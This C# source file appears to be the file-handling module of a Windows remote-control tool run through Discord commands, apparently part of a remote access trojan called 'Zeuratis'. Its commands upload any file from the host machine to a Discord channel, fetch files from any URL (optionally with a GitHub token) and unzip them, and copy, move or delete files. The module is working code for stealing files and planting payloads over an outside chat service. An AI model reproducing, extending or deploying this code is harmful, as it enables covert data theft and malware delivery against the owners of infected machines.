namespace Zeuratis;

[SupportedOSPlatform("windows")]
public class FileCommands : ModuleBase<SocketCommandContext>
{
    private static readonly HttpClient s_httpClient = new();

    [Command("UploadFile")]
    public async Task UploadFile(String filePath)
    {
        if (File.Exists(filePath))
        {
            if (Path.GetExtension(filePath).Equals(".zip") && new FileInfo(filePath).Length <= 8388608)
            {
                await Context.Channel.SendFileAsync(filePath);

                return;
            }

            File.Copy(filePath, $"tempfile\\{filePath.AsSpan(filePath.LastIndexOf("\\") + 1)}");
            ZipFile.CreateFromDirectory("tempfile", "file.zip");
           
            if (new FileInfo("file.zip").Length <= 8388608)
            {
                await Context.Channel.SendFileAsync("file.zip");
            }
            else
            {
                await ReplyAsync(embed: new EmbedBuilder
                {
                    Description = "This file is too large"
                }.Build());
            }
            
            File.Delete("file.zip");
            Zeuratis.ClearTemp();
        }
        else
        {
            await ReplyAsync($"No Path ( {filePath} ) Found");
        }
    }

    [Command("DownloadFile")]
    public async Task DownloadFile(String path, String hostName)
    {
        FileStream fileStream = File.Create(path);

        HttpResponseMessage response = await s_httpClient.GetAsync(hostName);
        response.EnsureSuccessStatusCode();

        Stream stream = await response.Content.ReadAsStreamAsync();
        stream.Seek(0, SeekOrigin.Begin);
        stream.CopyTo(fileStream);
        stream.Close();

        await ReplyAsync($"File Installed: {path}");
    }

    [Command("DownloadFileGithub")]
    public async Task DownloadFileGithub(String path, String hostName, String PAT = "", bool unzip = true)
    {
        if (PAT != "")
        {
            String credentials = String.Format(System.Globalization.CultureInfo.InvariantCulture, "{0}:", PAT);
            credentials = Convert.ToBase64String(Encoding.ASCII.GetBytes(credentials));

            s_httpClient.DefaultRequestHeaders.Authorization = new("Basic", credentials);
        }

        await DownloadFile(path, hostName);

        s_httpClient.DefaultRequestHeaders.Clear();

        if (unzip)
        {
            ZipFile.ExtractToDirectory(path, Path.GetDirectoryName(path) + "\\");
        }
    }

    [Command("ZipFile")]
    public async Task CreateZipFile(String path, String desPath = "")
    {
        ZipFile.CreateFromDirectory(path, desPath == "" ? Path.GetDirectoryName(path) + "\\" + new FileInfo(path).Name + ".zip" : desPath);
        await ReplyAsync($"Zipped File: {path}");
    }

    [Command("UnZipFile")]
    public async Task UnZipFile(String path, String desPath = "")
    {
        ZipFile.ExtractToDirectory(path, desPath == "" ? Path.GetDirectoryName(path)! : desPath);
        await ReplyAsync($"UnZipped File: {path}");
    }

    [Command("CopyFile")]
    public async Task CopyFile(String path, String desPath)
    {
        File.Copy(path, desPath, true);
        await ReplyAsync("Copied File");
    }

    [Command("MoveFile")]
    public async Task MoveFile(String path, String desPath)
    {
        File.Move(path, desPath, true);
        await ReplyAsync("Moved File");
    }

    [Command("DeleteFile")]
    public async Task DeleteFile(String path)
    {
        File.Delete(path);
        await ReplyAsync("Deleted File");
    }
}
